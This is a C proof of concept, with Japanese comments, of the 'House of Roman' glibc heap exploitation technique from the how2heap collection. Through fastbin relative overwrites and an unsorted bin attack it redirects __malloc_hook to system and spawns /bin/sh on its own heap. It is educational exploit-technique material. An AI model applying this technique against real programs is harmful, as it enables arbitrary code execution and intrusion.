#define _GNU_SOURCE     /* for RTLD_NEXT */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>

char* shell = "/bin/sh\x00";

/* 
この手法は、Ubuntu 16.04 上で how2heap 内の glibc_build.sh スクリプトを使って GLibC 2.23、2.24 でテストされています。2.25 は Ubuntu 17.04 でテストされました。

コンパイル: gcc -fPIE -pie house_of_roman.c -o house_of_roman

POC written by Maxwell Dulin (Strikeout) 
*/

// printf のバッファリングを無効にするために使います(ヒープのアラインメントを乱すため)
void* init(){
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
}


int main(){

	/* 
	この手法の主な目的は、シェルを得るための **リークなし(leakless)** の
	ヒープエクスプロイト手法を作ることです。これは主に、**相対上書き(relative overwrite)** を使って、
	ポインタの正確な値を知らなくても、ポインタを適切な位置に
	置くことで実現します。

	最初のステップは、__malloc_hook の中を指すポインタを得ることです。
	これは、次のような fastbin を作ることで行います。
	ptr_to_chunk -> ptr_to_libc。そして、ptr_to_libc を
	(相対上書きで)書き換えて __malloc_hook を指すようにします。
			
	次のステップは、__malloc_hook に対して unsorted bin 攻撃を実行することです
	(__malloc_hook は、前の攻撃によって制御できるようになっています)。ここでも、
	chunk->bk を相対上書きで書き換えることで unsorted_bin 攻撃を実行します。

	最後に、unsorted_bin 攻撃で libc の値を __malloc_hook の中に
	入れた後、もう一度 __malloc_hook の値に相対上書きを行い、
	one_gadget や system などの関数を指すようにします。
	
	これで、次に malloc を実行したときにシェルが起動します! :) 
	ただし、これには代償があります。12ビットのランダム性を
	ブルートフォースしなければなりません(成功確率は 0.02%)。

	*House of Roman* の元の解説は、次の場所にあります。
	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.





	この手法では、UAF やなんらかのオーバーフローによって、fastbin と unsorted bin の
	ポインタを編集できる必要があります。さらに、この手法では、割り当てサイズと
	解放(free)を十分に制御できることも必要です。
	*/

	char* introduction = "\nHouse of Roman へようこそ\n\n"
			     "これは、リークなし(LEAKLESS)のヒープエクスプロイト手法です。\n"
			     "攻撃は3つの段階からなります: \n\n"
			     "1. fastbin のチャンクを __malloc_hook に向ける。\n"
			     "2. __malloc_hook に対して unsorted_bin 攻撃を実行する。\n"
			     "3. __malloc_hook にある main_arena の値を相対上書きする。\n\n"
			     "上記のことはすべて、2つの主要な概念を使って行われます。\n"
                             "相対上書きとヒープ風水(heap feng shui)です。\n\n"
			     "ただし、この手法には代償があります。\n"
                             "12ビットのエントロピーをブルートフォースする必要があります。\n"
			     "つまり、この手法は4096回に1回、すなわち 0.02% の確率でしか成功しません。\n"
			     "**NOTE**: このエクスプロイトでは、結果を一定にするために、ランダムな値を固定しています。\n\n\n";
	puts(introduction);	
	init();


	/*	
	パート1: fastbin のチャンクが __malloc_hook を指す

	最初のステップは、main_arena を fastbin のチャンクの並びの中に入れることです。
	これを正しく並べるには、大量のヒープ風水が必要です。
	ただし、ざっと見ると次のようになります。

	まず、fastbin に入っていて、fd に
	ヒープチャンクへのポインタを持つチャンクを用意する必要があります。
	次に、このチャンクが(別のヒープチャンクにある)LibC へのポインタを指すようにします。
	以下のセットアップはすべて、相対上書きを行うために、上で述べた構成を
	作るためのものです。 ";


	LibC へのポインタを得る方法は2つあります。
			- small/large/unsorted_bins にあるチャンクを分割して、
				サイズ 0x70 として割り当てる。
			- 以前に使った small/large チャンクのサイズを 0x71 に上書きする。

	例として、必要な脆弱性が少なくて済むので、ここでは最初の方法を使います。	
	*/

	puts("ステップ1: fastbin のチャンクを __malloc_hook に向ける\n\n");
	puts("ヒープ風水で、相対上書きのためのチャンクを準備します。\n");

	// 後で UAF のチャンクとして使い、ヒープポインタを書き換えて LibC の値を指すようにします。	
	uint8_t* fastbin_victim = malloc(0x60); 

	// 後の相対オフセットのために良いアラインメントを得るために、これを割り当てます
	// (ヒープ上で4ビットのブルートフォースを避けるため、
	// 1バイトだけを上書きしたいのです)。
	malloc(0x80);

	// オフセット 0x100
	uint8_t* main_arena_use = malloc(0x80);
	
	// オフセット 0x190
	// このポインタは、'main_arena_use' チャンクに対する相対オフセットに使います
	uint8_t* relative_offset_heap = malloc(0x60);
	
	// このチャンクを free して unsorted_bin に入れます。 
	// このチャンクは、fd と bk の両方のポインタに main_arena + 0x68 を持ちます。
	free(main_arena_use);
	

	/* 
	unsorted_bin のチャンク(今 free したもの)の一部を取り出します。
	このチャンクの fd と bk には main_arena のポインタが
	入っているので、このチャンクが欲しいのです(後の相対上書きに使います)。

	サイズをちょうど 0x60 にしているのは、後でこれを 0x70 の fastbin に入れるためです。 

	これは同じサイズでなければなりません。後で使う __malloc_hook の偽の
	チャンクは、fastbin のサイズとして 0x7f を使うからです。
	(malloc 内には)チャンクのサイズが fastbin のサイズと一致することを確認する
	セキュリティチェックがあります。
	*/

	puts("fd ポインタに LibC の main_arena へのポインタを持つチャンクを割り当てます。\n");
//Offset 0x100. Has main_arena + 0x68 in fd and bk.
	uint8_t* fake_libc_chunk = malloc(0x60);

	//// NOTE: This is NOT part of the exploit... \\\
	// __malloc_hook は、このエクスプロイトが複数のバージョンの GLibC で動くよう、オフセットを求めるために計算しています。 
	long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8;


	// このフィラー(filler)が必要なのは、下の上書きが動作するために、
	// fd スロットにポインタが入っている必要があるからです。 
	// このチャンクを free すると、後で使うために 'fastbin_victim' の fd スロットにチャンクが入ります。 
	free(relative_offset_heap);	

    	/* 
    	このチャンクに UAF を作ります。fastbin_victim が指しているチャンクは、
	現在オフセット 0x190(heap_relative_offset)にあることを思い出してください。
     	*/
	free(fastbin_victim);

	/*

	これで、ポインタが適切な位置に入ったので、相対上書きを始めます。
	この部分では、レイアウトを理解することがとても重要です。

	現在のヒープのレイアウト: 
	0x0:   fastbin_victim       - size 0x70 
	0x70:  alignment_filler     - size 0x90
	0x100: fake_libc_chunk      - size 0x70
	0x170: leftover_main        - size 0x20
	0x190: relative_offset_heap - size 0x70 

	bin のレイアウト: 
			fastbin:  fastbin_victim -> relative_offset_heap
			unsorted: leftover_main
	
	では、相対上書きを始めます。
	fastbin_victim は relative_offset_heap(オフセット 0x100〜0x200 の範囲にあります)を
	指していることを思い出してください。fastbin は単方向連結リストを使っており、
	次のチャンクは 'fd' スロットに入ります。

	fastbin_victim の最後のバイトを(0x90 から 0x00 に)*部分的に*書き換えることで、
	fastbin_victim の fd ポインタを fake_libc_chunk(オフセット 0x100)に
	移動させました。

	また、fake_libc_chunk は以前 unsorted_bin に入っていたことを思い出してください。 
	そのため、main_arena + 0x68 を指す fd ポインタを持っています。 

	これで、fastbin は次のようになります。 
	fastbin_victim -> fake_libc_chunk ->(main_arena + 0x68).


	(上で述べた)相対上書きは、以下で順を追って説明します。
	
	*/


	puts("\
ヒープチャンクの最初のバイトを上書きして、fastbin のチャンクを\n\
LibC のアドレスを持つチャンクに向けます\n");
	puts("\
Fastbin 0x70 は現在、次のようになっています:\n\
heap_addr -> heap_addr2 -> LibC_main_arena\n");
	fastbin_victim[0] = 0x00; // この位置は 0x100 です。ただし、書き換えたいのは最初のバイトだけです。そのため、ここに 0x0 を入れます。
	

	/*
	これで、fastbin は次のようになりました。 
			0x70: fastbin_victim -> fake_libc_chunk -> (main_arena + 0x68)
	
	fake_libc_chunk の fd ポインタが、何か有用なものを指すようにしたいところです。 
	そこで、__malloc_hook の位置を指すように書き換えましょう。 
	こうすれば、関数ポインタを制御できます。

	そのためには、有効な malloc サイズが必要です。__memalign_hook の中には、
	通常 0x7f で始まるアドレスがあります。 
	__memalign_hook の値のすぐ前はすべて 0 なので、
	アラインされていないチャンクを使えば、0x70 の fastbin で有効なサイズとして
	これを機能させられます。

	ここで、最初の4ビットのランダム性が関わってきます。 
	LibC アドレスの最初の12ビットは、アドレスに対して決定的です。 
	しかし、次の4ビット(合計で2バイト)はそうではありません。 
	
	そのため、2^4 通り(16通り)の可能性をブルートフォースして、
	正しい位置に合わせる必要があります。この「位置」は、
	GLibC のバージョンごとに異なります(注意してください)。

	この相対上書きの後、fastbin は次のようになります。
			0x70: fastbin_victim -> fake_libc_chunk -> (__malloc_hook - 0x23).

	*/
	
	/* 
	main_arena のポインタを相対上書きして、__malloc_hook の近くにある
	有効なチャンクを指すようにします。

	///// NOTE: このエクスプロイトを(ハードコードしたオフセットでの
	ブルートフォースをせずに)一貫して動かすために、値を手動で設定します。 \\\

	実際の攻撃では、この値はバージョンごとに固有であり、
	(ビットによっては)一部のビットをブルートフォースしなければなりません。
	*/ 

puts("\
fastbin 内の main_arena ポインタに相対上書きを行います。\n\
偽の fastbin チャンクを作るために、これを __malloc_hook の近くに向けます\n");
	long long __malloc_hook_adjust = __malloc_hook - 0x23; // malloc から 0x23 を引くのは、0x7f を有効な fastbin チャンクのサイズとして使いたいからです。

	// 相対上書き
	int8_t byte1 = (__malloc_hook_adjust) & 0xff; 	
	int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
	fake_libc_chunk[0] = byte1; // アドレスの最下位バイト。
	fake_libc_chunk[1] = byte2; // 実際の攻撃では、この上位4ビットをブルートフォースしなければなりません。

	// fastbin 内の __malloc_hook チャンクの前に、フィラーのチャンクが2つあります。 
	// fastbin_victim と fake_libc_chunk です。
	puts("偽のチャンクを __malloc_hook の近くに向けます\n");
	puts("\
実際のエクスプロイトでは、malloc_hook の最後の半バイトがランダムなため、\n\
これは 15/16 の確率で失敗します\n");	
	malloc(0x60);
	malloc(0x60);

	// 4ビットのブルートフォースが成功しなかった場合、チャンクのサイズが 
	// そのチャンクの bin と一致しないため、ここでクラッシュします。 
	// 成功した場合は、攻撃の次のステップに進めます。
	uint8_t* malloc_hook_chunk = malloc(0x60);	

	puts("ステップ1 通過 =)\n\n\n");

	/*
	パート2: Unsorted_bin 攻撃 

	これで、__malloc_hook の位置を制御できるようになりました。 
	しかし、LibC のアドレスはまだ分かりません。そのため、この攻撃でできることは
	多くありません。シェルを起動するには、__malloc_hook の位置に
	アドレスを入れる必要があります。

	unsorted_bin 攻撃を使って、__malloc_hook の値を
	main_arena + 0x68 のアドレスに書き換えます。 
	unsorted_bin 攻撃の詳細は、
	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c を参照してください。

	簡単に概要を述べると、unsorted_bin 攻撃では、unsorted_bin のチャンクの
	chunk->bk を書き換えることで、任意の場所に
	main_arena + 0x68 を書き込めます。この書き込み先として、
	__malloc_hook の位置を選びます。

	__malloc_hook を main_arena で上書きした後、そのポインタを
	(相対上書きで)書き換えて、すぐにコードを実行できる
	one_gadget を指すようにします。
			
	この相対上書きもうまく機能しますが、追加で
	1バイト(8ビット)のブルートフォースが必要です。
	これにより、成功させるために必要なランダム性は合計12ビットになります。
	成功確率はおよそ 1/4096、つまり 0.0244% です。

	
	攻撃のフェーズ2の手順は、以下で進めながら説明します。
	*/

	puts("\
ステップ2 開始: Unsorted_bin 攻撃\n\n\
unsorted bin 攻撃を使うと、任意の場所に大きな値を\n\
書き込めます。ただし、その値は制御できません。\n\
この値は常に main_arena + 0x68 です。 \n\
後で相対上書きを行うために、unsorted_bin 攻撃を \n\
__malloc_hook に向けます。\n");


	// 破壊するチャンクを用意します。free したときに統合(consolidation)されるのを防ぐために、別のポインタも追加します。
	
	uint8_t* unsorted_bin_ptr = malloc(0x80);	
	malloc(0x30); // 統合されたくありません

	puts("チャンクを unsorted_bin に入れます\n");
	// チャンクを free して UAF を作ります
	free(unsorted_bin_ptr);

	/* /// NOTE: byte2 の下位4ビットは、本来は前の段階でブルートフォースされているはずです。 \\\ 
	 ただし、例示のために、ここでは動的に計算しています。 
	*/
	__malloc_hook_adjust = __malloc_hook - 0x10; // ここで 0x10 を引くのは、unsorted_bin 攻撃で実際の上書きを行うのが chunk->fd だからです。
	byte1 = (__malloc_hook_adjust) & 0xff; 	
	byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 


	// 別の相対オフセットを使って、chunk->bk ポインタを上書きします。
	// 前のブルートフォース(前の4ビット)から、
	// この位置が分かっています。__malloc_hook から5バイト離れています。
	puts("チャンクの最後の2バイトを上書きして、__malloc_hook を指すようにします\n");
	unsorted_bin_ptr[8] = byte1; // bk のバイト 0。 	

	// //// NOTE: 通常は、バイトの後半部分もブルートフォースしなければなりません。ただし、例示のために、エクスプロイトを一貫して動かすよう、ここで設定しています。 ///
	unsorted_bin_ptr[9] = byte2; // bk のバイト 1。この後半の4ビットは前にブルートフォースされており、前半の4ビットは固定です。
	
	/* 
	unsorted bin 攻撃を発動します。
	これにより、bk ポインタ + 0x10 にあるアドレスに、(main_arena + 0x68)の値が書き込まれます。

	ただし、いくつか起こることがあります。 
		- unsorted bin(したがって small や large も)が
		   使えなくなります。そのため、以降は以前に fastbin にあった割り当てしか使えません。
		- 同じサイズのチャンク(unsorted_bin 攻撃のチャンク)を 
		   malloc *しない*と、直後にプログラムがクラッシュします。 
		   そのため、割り当て要求は unsorted_bin のチャンクと同じサイズでなければなりません。


	最初の点は(この攻撃では)まったく問題ありません。しかし、より複雑な
	プログラムでは、問題になることがあります。
	2つ目の点は、現在のチャンクと同じサイズで割り当てるだけで済みます。

	*/

	puts("unsorted_bin 攻撃を発動します\n");
	malloc(0x80); // unsorted_bin 攻撃を発動して、__malloc_hook を main_arena + 0x68 で上書きします

	long long system_addr = (long long)dlsym(RTLD_NEXT, "system");

	puts("ステップ2 通過 =)\n\n\n");
	/* 
	ステップ3: __malloc_hook を system に設定する
	
	チャンク自体は、__malloc_hook から 19 バイト離れた位置に割り当てられています。 
	そのため、(もう一度)相対上書きを使って、(unsorted_bin 攻撃で入れた)
	main_arena のポインタを部分的に上書きし、system を指すようにします。

	実際の攻撃では、最初の12ビットは(バージョンごとに)固定です。 
	しかし、その後の12ビットはブルートフォースしなければなりません。 

	/// NOTE: 例示のために、これらの値はブルートフォースせずに設定します。 \\\
	*/ 

	puts("ステップ3: __malloc_hook を system/one_gadget に設定する\n\n");
	puts("\
これで __malloc_hook の中に LibC へのポインタが入りました(ステップ2より)。 \n\
相対上書きを使って、これを system や one_gadget に向けられます。\n\
注: 実際の攻撃では、ここが最後の8ビットのブルートフォースが\n\
必要になる箇所です。\n");
	malloc_hook_chunk[19] = system_addr & 0xff; // 最初の12ビットは(バージョンごとに)固定です。

	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // これの下位4ビット(最後の4ビット)はブルートフォースしなければなりません(すでに実施済み)。
	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // 最後のバイトは、ブルートフォースしなければならない残りの8ビットです。
	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // データセクションとテキストセクションの間の隙間が非常に広い場合は、これも必要です。念のために入れています。


	// system 呼び出しが __malloc_hook から実行されることで、malloc の呼び出しによるコード実行を発動します。
	// 実際のエクスプロイトでは、おそらく one_gadget を使いたいところです。 
	// しかし、移植性を保つために、ここでは system を使い、引数として /bin/sh へのポインタを追加します。
	// これはやや不正ですが(バイナリは PIE です)、バイナリが PIE でなければ、.bss セクション内のポインタを使えば、リークなしで動作します。 
	// (一貫性のために)先に system のアドレスを取得するには、バイナリは PIE である必要があります。そのため、アドレスをここに入れています。
	puts("シェルを起動します!");
	malloc((long long)shell);
		
}
